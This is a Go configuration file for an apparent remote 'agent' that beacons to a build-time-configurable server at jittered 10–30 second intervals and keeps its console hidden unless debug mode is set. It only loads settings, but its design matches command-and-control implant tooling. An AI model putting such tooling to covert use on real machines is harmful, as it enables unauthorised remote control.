package config

import (
	"fmt"
	"os"
)

// DefaultServerURL can be overridden at build time using:
// -ldflags="-X 'bytecode-agent/internal/config.DefaultServerURL=http://your-ip:3001'"
var DefaultServerURL = "http://localhost:3001"

// DebugMode can be set to "true" at build time to show the console and enable verbose logging
var DebugMode = "false"

// Config holds the agent configuration
type Config struct {
	ServerURL     string
	BeaconMin     int // Minimum beacon interval in seconds
	BeaconMax     int // Maximum beacon interval in seconds (jitter)
	IdentityFile  string
	IsDebug       bool
}

// DefaultBeaconMin can be overridden at build time
var DefaultBeaconMin = "10"

// DefaultBeaconMax can be overridden at build time
var DefaultBeaconMax = "30"

// Load returns the agent configuration from environment or defaults
func Load() *Config {
	serverURL := os.Getenv("BYTECODE_SERVER")
	if serverURL == "" {
		serverURL = DefaultServerURL
	}

	identityFile := os.Getenv("BYTECODE_IDENTITY")
	if identityFile == "" {
		identityFile = ".bytecode_id"
	}

	// Simple conversion from string to int for build-time flags
	var min, max int
	fmt.Sscanf(DefaultBeaconMin, "%d", &min)
	fmt.Sscanf(DefaultBeaconMax, "%d", &max)

	return &Config{
		ServerURL:    serverURL,
		BeaconMin:    min,
		BeaconMax:    max,
		IdentityFile: identityFile,
		IsDebug:      DebugMode == "true",
	}
}
